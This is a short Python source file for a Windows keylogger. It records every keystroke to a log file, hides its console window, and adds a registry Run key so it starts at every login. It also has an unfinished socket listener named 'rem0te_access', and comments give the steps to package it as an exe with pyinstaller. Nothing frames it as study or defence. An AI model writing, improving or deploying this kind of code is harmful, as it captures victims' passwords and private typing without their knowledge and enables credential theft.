from pynput.keyboard import Key, Listener
import os
import smtplib
import socket
import winreg
import sys

f = open(r'C:\Users\Vlad\Desktop\OPArianG0ne\\log.txt','w')

def on_press(key):
    f.write('{0}'.format(
        key,'\n'))  

def on_release(key):
    f.write('{0}'.format(
        key,'\n'))
    if key == Key.esc:
        # Stop listener
        return False

def collect():
    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def depend_me():   
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key,'keylog',0,winreg.REG_SZ,"C:\Program Files (x86)\Python36-32\Scripts\dist\\1.exe") 

def rem0te_access(address,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((HOST,PORT))
    s.listen(1)
    conn, addr = s.accept()
    data = conn.recv(3072)
    if 'hi' in data:
        conn.sendall('hello from m0le!')


def main():
    depend_me()
    hide()
    collect()

main()

#to make an exe pyinstaller.exe --onefile "C:\Users\Vlad\Desktop\OPArianG0ne\1.py"
#pyinstall for u vlad is in prog files x86 python 36 scripts
#needs to be installed pyinstaller to be converted to an exe
